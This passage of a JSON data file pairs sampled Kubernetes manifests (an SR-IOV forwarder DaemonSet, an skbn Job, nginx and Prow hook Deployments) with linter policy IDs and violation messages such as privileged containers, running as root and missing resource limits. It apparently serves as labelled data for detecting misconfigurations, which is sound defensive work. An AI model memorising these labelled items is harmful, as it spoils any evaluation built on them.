hostPath:\n          path: /dev/vfio\n          type: DirectoryOrCreate\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"forwarder-sriov\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "10120",
    "manifest_path": "data/manifests/the_stack_sample/sample_3901.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: forwarder-sriov\n  labels:\n    app: forwarder-sriov\nspec:\n  selector:\n    matchLabels:\n      app: forwarder-sriov\n  template:\n    metadata:\n      labels:\n        app: forwarder-sriov\n    spec:\n      containers:\n      - image: networkservicemeshci/cmd-forwarder-sriov:ac7772ee\n        imagePullPolicy: IfNotPresent\n        name: forwarder-sriov\n        securityContext:\n          privileged: true\n        env:\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_CONNECT_TO\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock\n        - name: NSM_SRIOV_CONFIG_FILE\n          value: /var/lib/networkservicemesh/sriov.config\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm\n          mountPath: /var/lib/networkservicemesh\n        - name: kubelet-socket\n          mountPath: /var/lib/kubelet\n        - name: cgroup\n          mountPath: /host/sys/fs/cgroup\n        - name: vfio\n          mountPath: /host/dev/vfio\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: Directory\n      - name: kubelet-socket\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: cgroup\n        hostPath:\n          path: /sys/fs/cgroup\n          type: Directory\n      - name: vfio\n        hostPath:\n          path: /dev/vfio\n          type: DirectoryOrCreate\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"forwarder-sriov\" is privileged"
  },
  {
    "id": "10121",
    "manifest_path": "data/manifests/the_stack_sample/sample_3901.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: forwarder-sriov\n  labels:\n    app: forwarder-sriov\nspec:\n  selector:\n    matchLabels:\n      app: forwarder-sriov\n  template:\n    metadata:\n      labels:\n        app: forwarder-sriov\n    spec:\n      containers:\n      - image: networkservicemeshci/cmd-forwarder-sriov:ac7772ee\n        imagePullPolicy: IfNotPresent\n        name: forwarder-sriov\n        securityContext:\n          privileged: true\n        env:\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_CONNECT_TO\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock\n        - name: NSM_SRIOV_CONFIG_FILE\n          value: /var/lib/networkservicemesh/sriov.config\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm\n          mountPath: /var/lib/networkservicemesh\n        - name: kubelet-socket\n          mountPath: /var/lib/kubelet\n        - name: cgroup\n          mountPath: /host/sys/fs/cgroup\n        - name: vfio\n          mountPath: /host/dev/vfio\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: Directory\n      - name: kubelet-socket\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: cgroup\n        hostPath:\n          path: /sys/fs/cgroup\n          type: Directory\n      - name: vfio\n        hostPath:\n          path: /dev/vfio\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"forwarder-sriov\" is not set to runAsNonRoot"
  },
  {
    "id": "10122",
    "manifest_path": "data/manifests/the_stack_sample/sample_3901.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: forwarder-sriov\n  labels:\n    app: forwarder-sriov\nspec:\n  selector:\n    matchLabels:\n      app: forwarder-sriov\n  template:\n    metadata:\n      labels:\n        app: forwarder-sriov\n    spec:\n      containers:\n      - image: networkservicemeshci/cmd-forwarder-sriov:ac7772ee\n        imagePullPolicy: IfNotPresent\n        name: forwarder-sriov\n        securityContext:\n          privileged: true\n        env:\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_CONNECT_TO\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock\n        - name: NSM_SRIOV_CONFIG_FILE\n          value: /var/lib/networkservicemesh/sriov.config\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm\n          mountPath: /var/lib/networkservicemesh\n        - name: kubelet-socket\n          mountPath: /var/lib/kubelet\n        - name: cgroup\n          mountPath: /host/sys/fs/cgroup\n        - name: vfio\n          mountPath: /host/dev/vfio\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: Directory\n      - name: kubelet-socket\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: cgroup\n        hostPath:\n          path: /sys/fs/cgroup\n          type: Directory\n      - name: vfio\n        hostPath:\n          path: /dev/vfio\n          type: DirectoryOrCreate\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"forwarder-sriov\" has cpu request 0"
  },
  {
    "id": "10123",
    "manifest_path": "data/manifests/the_stack_sample/sample_3901.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: forwarder-sriov\n  labels:\n    app: forwarder-sriov\nspec:\n  selector:\n    matchLabels:\n      app: forwarder-sriov\n  template:\n    metadata:\n      labels:\n        app: forwarder-sriov\n    spec:\n      containers:\n      - image: networkservicemeshci/cmd-forwarder-sriov:ac7772ee\n        imagePullPolicy: IfNotPresent\n        name: forwarder-sriov\n        securityContext:\n          privileged: true\n        env:\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_CONNECT_TO\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock\n        - name: NSM_SRIOV_CONFIG_FILE\n          value: /var/lib/networkservicemesh/sriov.config\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm\n          mountPath: /var/lib/networkservicemesh\n        - name: kubelet-socket\n          mountPath: /var/lib/kubelet\n        - name: cgroup\n          mountPath: /host/sys/fs/cgroup\n        - name: vfio\n          mountPath: /host/dev/vfio\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: Directory\n      - name: kubelet-socket\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: cgroup\n        hostPath:\n          path: /sys/fs/cgroup\n          type: Directory\n      - name: vfio\n        hostPath:\n          path: /dev/vfio\n          type: DirectoryOrCreate\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"forwarder-sriov\" has memory limit 0"
  },
  {
    "id": "10124",
    "manifest_path": "data/manifests/the_stack_sample/sample_3903.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: tomcat-demo\n  labels:\n    run: tomcat-demo\nspec:\n  clusterIP: None\n  ports:\n  - name: http\n    protocol: TCP\n    port: 80\n    targetPort: 8080\n  selector:\n    run: tomcat-demo\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[run:tomcat-demo])"
  },
  {
    "id": "10125",
    "manifest_path": "data/manifests/the_stack_sample/sample_3904.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: skbn\n  name: skbn\nspec:\n  template:\n    metadata:\n      labels:\n        app: skbn\n    spec:\n      serviceAccountName: skbn\n      containers:\n      - name: skbn\n        image: skbn\n        command:\n        - /skbn\n        args:\n        - cp\n        - --src\n        - k8s://namespace/pod/container/path/to/copy/from\n        - --dst\n        - s3://bucket/path/to/copy/to\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: AWS_REGION\n          value: eu-central-1\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "10126",
    "manifest_path": "data/manifests/the_stack_sample/sample_3904.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: skbn\n  name: skbn\nspec:\n  template:\n    metadata:\n      labels:\n        app: skbn\n    spec:\n      serviceAccountName: skbn\n      containers:\n      - name: skbn\n        image: skbn\n        command:\n        - /skbn\n        args:\n        - cp\n        - --src\n        - k8s://namespace/pod/container/path/to/copy/from\n        - --dst\n        - s3://bucket/path/to/copy/to\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: AWS_REGION\n          value: eu-central-1\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"skbn\" is using an invalid container image, \"skbn\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10127",
    "manifest_path": "data/manifests/the_stack_sample/sample_3904.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: skbn\n  name: skbn\nspec:\n  template:\n    metadata:\n      labels:\n        app: skbn\n    spec:\n      serviceAccountName: skbn\n      containers:\n      - name: skbn\n        image: skbn\n        command:\n        - /skbn\n        args:\n        - cp\n        - --src\n        - k8s://namespace/pod/container/path/to/copy/from\n        - --dst\n        - s3://bucket/path/to/copy/to\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: AWS_REGION\n          value: eu-central-1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"skbn\" does not have a read-only root file system"
  },
  {
    "id": "10128",
    "manifest_path": "data/manifests/the_stack_sample/sample_3904.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: skbn\n  name: skbn\nspec:\n  template:\n    metadata:\n      labels:\n        app: skbn\n    spec:\n      serviceAccountName: skbn\n      containers:\n      - name: skbn\n        image: skbn\n        command:\n        - /skbn\n        args:\n        - cp\n        - --src\n        - k8s://namespace/pod/container/path/to/copy/from\n        - --dst\n        - s3://bucket/path/to/copy/to\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: AWS_REGION\n          value: eu-central-1\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"skbn\" not found"
  },
  {
    "id": "10129",
    "manifest_path": "data/manifests/the_stack_sample/sample_3904.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: skbn\n  name: skbn\nspec:\n  template:\n    metadata:\n      labels:\n        app: skbn\n    spec:\n      serviceAccountName: skbn\n      containers:\n      - name: skbn\n        image: skbn\n        command:\n        - /skbn\n        args:\n        - cp\n        - --src\n        - k8s://namespace/pod/container/path/to/copy/from\n        - --dst\n        - s3://bucket/path/to/copy/to\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: AWS_REGION\n          value: eu-central-1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"skbn\" is not set to runAsNonRoot"
  },
  {
    "id": "10130",
    "manifest_path": "data/manifests/the_stack_sample/sample_3904.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: skbn\n  name: skbn\nspec:\n  template:\n    metadata:\n      labels:\n        app: skbn\n    spec:\n      serviceAccountName: skbn\n      containers:\n      - name: skbn\n        image: skbn\n        command:\n        - /skbn\n        args:\n        - cp\n        - --src\n        - k8s://namespace/pod/container/path/to/copy/from\n        - --dst\n        - s3://bucket/path/to/copy/to\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: AWS_REGION\n          value: eu-central-1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"skbn\" has cpu request 0"
  },
  {
    "id": "10131",
    "manifest_path": "data/manifests/the_stack_sample/sample_3904.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: skbn\n  name: skbn\nspec:\n  template:\n    metadata:\n      labels:\n        app: skbn\n    spec:\n      serviceAccountName: skbn\n      containers:\n      - name: skbn\n        image: skbn\n        command:\n        - /skbn\n        args:\n        - cp\n        - --src\n        - k8s://namespace/pod/container/path/to/copy/from\n        - --dst\n        - s3://bucket/path/to/copy/to\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: AWS_REGION\n          value: eu-central-1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"skbn\" has memory limit 0"
  },
  {
    "id": "10132",
    "manifest_path": "data/manifests/the_stack_sample/sample_3905.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backend1\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: backend1\n  template:\n    metadata:\n      labels:\n        app: backend1\n    spec:\n      containers:\n      - name: backend1\n        image: nginxdemos/nginx-hello:plain-text\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10133",
    "manifest_path": "data/manifests/the_stack_sample/sample_3905.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backend1\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: backend1\n  template:\n    metadata:\n      labels:\n        app: backend1\n    spec:\n      containers:\n      - name: backend1\n        image: nginxdemos/nginx-hello:plain-text\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"backend1\" does not have a read-only root file system"
  },
  {
    "id": "10134",
    "manifest_path": "data/manifests/the_stack_sample/sample_3905.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backend1\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: backend1\n  template:\n    metadata:\n      labels:\n        app: backend1\n    spec:\n      containers:\n      - name: backend1\n        image: nginxdemos/nginx-hello:plain-text\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"backend1\" is not set to runAsNonRoot"
  },
  {
    "id": "10135",
    "manifest_path": "data/manifests/the_stack_sample/sample_3905.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backend1\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: backend1\n  template:\n    metadata:\n      labels:\n        app: backend1\n    spec:\n      containers:\n      - name: backend1\n        image: nginxdemos/nginx-hello:plain-text\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"backend1\" has cpu request 0"
  },
  {
    "id": "10136",
    "manifest_path": "data/manifests/the_stack_sample/sample_3905.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backend1\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: backend1\n  template:\n    metadata:\n      labels:\n        app: backend1\n    spec:\n      containers:\n      - name: backend1\n        image: nginxdemos/nginx-hello:plain-text\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"backend1\" has memory limit 0"
  },
  {
    "id": "10137",
    "manifest_path": "data/manifests/the_stack_sample/sample_3906.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20220209-cd556c1953\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/kubeconfig\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: k8s-infra-prow-hmac-token\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "10138",
    "manifest_path": "data/manifests/the_stack_sample/sample_3906.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20220209-cd556c1953\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/kubeconfig\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: k8s-infra-prow-hmac-token\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10139",
    "manifest_path": "data/manifests/the_stack_sample/sample_3906.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20220209-cd556c1953\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/kubeconfig\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: k8s-infra-prow-hmac-token\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hook\" does not have a read-only root file system"
  },
  {
    "id": "10140",
    "manifest_path": "data/manifests/the_stack_sample/sample_3906.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20220209-cd556c1953\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/kubeconfig\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: k8s-infra-prow-hmac-token\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"hook\" not found"
  },
  {
    "id": "10141",
    "manifest_path": "data/manifests/the_stack_sample/sample_3906.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20220209-cd556c1953\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/kubeconfig\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: k8s-infra-prow-hmac-token\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "10142",
    "manifest_path": "data/manifests/the_stack_sample/sample_3906.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20220209-cd556c1953\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/kubeconfig\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: k8s-infra-prow-hmac-token\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hook\" is not set to runAsNonRoot"
  },
  {
    "id": "10143",
    "manifest_path": "data/manifests/the_stack_sample/sample_3906.yaml",
